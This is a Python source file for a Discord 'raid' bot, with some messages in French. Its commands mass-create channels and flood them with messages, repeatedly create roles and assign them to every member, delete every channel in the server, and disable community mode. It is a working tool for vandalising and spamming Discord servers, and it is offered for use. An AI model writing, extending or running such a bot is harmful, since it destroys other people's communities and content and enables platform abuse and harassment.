import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')

async def create_channel_and_send_messages(guild, i):
    channel = await guild.create_text_channel(f'your-title-here {i}')
    for j in range(1, 5):
        await channel.send(f' your msg here {j}')

@bot.command(name='raid')
async def raid(ctx, times: int):
    guild = ctx.guild
    
    tasks = [create_channel_and_send_messages(guild, i) for i in range(1, times + 1)]
    await asyncio.gather(*tasks)

@bot.command(name='role')
async def create_role(ctx, role_name: str, times: int):
    guild = ctx.guild

    for _ in range(times):
        role = await guild.create_role(name=role_name)
        for member in guild.members:
            await member.add_roles(role)

    await ctx.send(f"Le rôle {role_name} a été créé {times} fois et attribué à tous les membres.")

@bot.command(name='delete_channels')
async def delete_channels(ctx):
    guild = ctx.guild
    channels = guild.channels
    for channel in channels:
        await channel.delete()
    await ctx.send('All channels have been deleted!')

@bot.command(name='pass', help='Désactive le mode communauté sur le serveur')
@commands.has_permissions(administrator=True)
async def pass_command(ctx):
    guild = ctx.guild
    community_mode = guild.community
    if community_mode.enabled:
        await community_mode.disable()
        await ctx.send('Mode communauté désactivé avec succès!')
    else:
        await ctx.send('Le mode communauté est déjà désactivé.')

bot.run('YOU_BOT_TOKEN')
